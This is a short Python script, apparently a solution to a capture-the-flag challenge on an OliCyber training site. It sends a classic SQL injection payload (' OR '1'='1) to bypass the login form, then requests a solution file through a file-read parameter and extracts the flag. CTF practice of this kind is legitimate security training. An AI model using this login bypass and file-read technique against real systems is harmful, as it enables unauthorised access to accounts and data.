import requests

url = 'http://trova-le-soluzioni-3.challs.olicyber.it/'

s = requests.session()

payload = {'username': "ciao' OR '1'='1", 'password': 'whatever'}
r = s.post(url, data=payload).text
print(r)



url2 = "http://trova-le-soluzioni-3.challs.olicyber.it/read.php?file=/soluzioni/20240509.txt"
r = s.get(url2).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)



